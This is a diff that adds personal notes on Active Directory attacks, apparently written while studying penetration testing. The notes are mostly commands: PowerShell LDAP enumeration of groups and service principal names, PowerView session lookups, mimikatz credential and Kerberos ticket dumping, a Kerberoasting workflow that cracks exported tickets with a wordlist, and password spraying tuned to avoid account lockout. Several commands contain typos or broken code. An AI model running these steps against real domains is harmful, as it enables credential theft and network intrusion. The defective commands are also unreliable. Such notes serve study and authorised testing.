@@ -46,3 +46,148 @@ Foreach($obj in $Result)
  
  }
  
+
+
+
+// Only prining name for group
+
+$domainobj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.RdcRoleOwner).Name
+
+$SearchString += "LDAP://"
+
+$SearchString += $PDC+ "/"
+
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.',',DC='))"
+
+$SearchString += $DistinguishedName
+
+$SearchString 
+
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+
+$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+
+$Searcher.SearchRoot = $objDomain
+
+$Searcher.filter="(objectClass=Group)"  // name=Secret_Group    or Nested_Group
+
+$Result = $Searcher.FindAll()
+
+Foreach($obj in $Result)
+{
+$obj.Properties.name
+ }
+
+
+
+\\currenty logged in users for cached credentials - powershell empire script
+
+Import-Modeule .\PowerView.ps1
+
+Get-NetLoggedon -ComputerName nameofcomputer
+
+Get-NetSession -ComputerName domaincontrollername
+
+// printing the service 
+
+$domainobj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.RdcRoleOwner).Name
+
+$SearchString += "LDAP://"
+
+$SearchString += $PDC+ "/"
+
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.',',DC='))"
+
+$SearchString += $DistinguishedName
+
+$SearchString 
+
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+
+$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+
+$Searcher.SearchRoot = $objDomain
+
+$Searcher.filter="serviceprincipalname=*http*"
+
+$Result = $Searcher.FindAll()
+
+Foreach($obj in $Result)
+{
+ Foreach($prop in $obj.Properties)
+{
+$prop
+ }
+ }
+
+
+///
+now use nslookup
+
+
+// hash credentidal swiss army knife
+cmd with elevated privilege
+
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords  //dump hashes
+sekurlsa::tickets   //dump tickets  TGT & TGS
+
+
+// request service tkt from DC -- spn required i.e. test.com
+on powershell
+
+Add-Type -AssemblyName System.IdentityModel.Tokens.KerberosSecurityToken -ArgumentList 'HTTP/SPN
+
+
+//klist instead of mimikatz
+Klist
+
+on Mimikatz
+kerberos::list /export
+
+//administrative priveledge required
+ftp IP
+bin
+put file@spn
+quit
+
+install keberos
+
+sudo apt update && sudo apt install keberoast
+
+python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt /ftphome/file@spn
+
+
+// low and slow to avoid lockout
+net accounts
+
+first withh correct password and try with incorrect password
+
+$domainobj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.RdcRoleOwner).Name
+
+$SearchString += "LDAP://"
+
+$SearchString += $PDC+ "/"
+
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.',',DC='))"
+
+$SearchString += $DistinguishedName
+
+New-Object System.DirectoryServices.DirectoryEntry($SearchString, "user","password")
+
+
+
+
+\\ in windows 10
+tools\active_directory
+.\Spray-Passwords.ps1 -pass password -admin
+
+
+
+
+
+
